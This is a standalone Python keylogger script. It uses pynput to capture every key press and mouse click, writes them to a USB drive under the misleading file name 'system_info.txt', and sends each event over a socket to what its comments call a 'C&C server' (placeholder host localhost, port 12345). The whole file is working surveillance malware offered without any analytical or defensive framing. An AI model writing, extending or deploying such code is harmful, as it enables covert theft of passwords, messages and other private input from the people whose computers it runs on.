import os
import logging
import socket
from pynput import keyboard, mouse

# Specify the USB drive's mount point
usb_drive_path = 'E:'

# New file names
log_file = os.path.join(usb_drive_path, 'log_data.txt')
txt_file = os.path.join(usb_drive_path, 'system_info.txt')

# Define the IP address and port of your C&C server
SERVER_IP = "localhost"
SERVER_PORT = 12345

# Function to send logs to the server
def send_logs(log_data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        s.sendall(log_data.encode())

# Create or open system_info.txt in write mode to clear its content
with open(txt_file, 'w'):
    pass

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define a dictionary to map the key codes to the actual keys
key_map = {
    '<96>': '0',
    '<97>': '1',
    '<98>': '2',
    '<99>': '3',
    '<100>': '4',
    '<101>': '5',
    '<102>': '6',
    '<103>': '7',
    '<104>': '8',
    '<105>': '9',
    '<110>': '.'
}

def on_press(key):
    try:
        # Log the key press
        key_pressed = str(key)
        if key_pressed in key_map:
            key_pressed = key_map[key_pressed]
        
        logging.info(f'Key Pressed: {key_pressed}')

        # Append the key to system_info.txt
        with open(txt_file, 'a') as key_file:
            key_file.write(f'{key_pressed}\n')

        # Send logs to the C&C server
        log_data = f'Key Pressed: {key_pressed}\n'
        send_logs(log_data)
    except AttributeError:
        pass

def on_click(x, y, button, pressed):
    if pressed:
        # Log the mouse click
        logging.info('Mouse Clicked: {0} at {1}'.format(button, (x, y)))

        # Append the mouse click to system_info.txt
        with open(txt_file, 'a') as key_file:
            key_file.write('Mouse Clicked: {0} at {1}\n'.format(button, (x, y)))

        # Send logs to the C&C server
        log_data = f'Mouse Clicked: {button} at ({x}, {y})\n'
        send_logs(log_data)

# Start the listener for keyboard events
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Start the listener for mouse events
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()

try:
    keyboard_listener.join()  # Run the keyboard listener indefinitely
except KeyboardInterrupt:
    pass
finally:
    # Cleanup and stop the listeners
    keyboard_listener.stop()
    mouse_listener.stop()
